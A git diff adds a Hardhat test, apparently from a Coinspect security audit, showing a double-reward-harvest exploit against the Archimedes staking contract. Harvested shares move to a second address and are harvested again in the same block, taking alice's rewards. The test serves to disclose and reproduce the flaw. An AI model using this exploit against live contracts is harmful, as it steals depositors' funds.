@@ -488,4 +488,57 @@ describe('Archimedes', () => {
       ).to.be.equal(1.1e6)
     })
   })
+
+  describe('COINSPECT attacks', async () => {
+    it('Double reward harvest', async () => {
+      // Deposit without rewards yet
+      await piToken.transfer(bob.address, 10)
+      await piToken.connect(bob).approve(archimedes.address, 10)
+      await (await archimedes.connect(bob).deposit(0, 10, zeroAddress)).wait()
+      // Victim
+      await piToken.transfer(alice.address, 10)
+      await piToken.connect(alice).approve(archimedes.address, 10)
+      await (await archimedes.connect(alice).deposit(0, 10, zeroAddress)).wait()
+      expect(
+        await piToken.balanceOf(archimedes.address)
+      ).to.be.equal(0)
+      // Still behind the reward block
+      const rewardBlock = parseInt(await archimedes.startBlock(), 10)
+      const currentBlock = parseInt(await getBlock(), 10)
+      expect(rewardBlock).to.be.greaterThan(currentBlock)
+      expect(await archimedes.connect(bob).pendingPiToken(0)).to.be.equal(0)
+      await mineNTimes(rewardBlock - currentBlock)
+      // This should mint a reward of 0.23~ for the first block
+      await (await archimedes.updatePool(0)).wait() // rewardBlock + 1
+      const piPerBlock = toNumber(await archimedes.piTokenPerBlock())
+      expect(
+        await piToken.balanceOf(archimedes.address)
+      ).to.be.equal(
+        toNumber(piPerBlock)
+      )
+      await mineNTimes(5)
+      await network.provider.send("evm_setAutomine", [false]);
+      await network.provider.send("evm_setIntervalMining", [5000]);
+      console.log("\n\n! 1) bob harvesting")
+      archimedes.connect(bob).harvest(0) // rewardBlock + 2 + 5
+      // ATTACK: already harvested shares get transferred and
+      // re-harvested from another address, stealing from alice
+      let mal = (await ethers.getSigners())[8]
+      console.log("! 2) transferring 10 shares from bob to mal")
+      controller.connect(bob).transfer(mal.address, 10)
+      console.log("! 3) mal harvesting")
+      archimedes.connect(mal).harvest(0)
+      //await network.provider.send("evm_setAutomine", [true]);
+      console.log("! 4) alice harvesting")
+      await (await archimedes.connect(alice).harvest(0)).wait()
+      console.log("\n\n! block got mined with previous 4 TXs")
+      let bobBalanceAfter = await piToken.balanceOf(bob.address)
+      console.log(" after harvest -> bobBalance = " + bobBalanceAfter/piPerBlock + "pi/block")
+      let aliceBalanceAfter = await piToken.balanceOf(alice.address)
+      console.log(" after harvest -> aliceBalance = " + aliceBalanceAfter/piPerBlock + " pi/block")
+      let malBalanceAfter = await piToken.balanceOf(mal.address)
+      console.log(" after shares transfer and harvest -> malBalance = " + malBalanceAfter/piPerBlock + " pi/block")
+      await network.provider.send("evm_setAutomine", [true]);
+    }).timeout(0)
+  })
 })
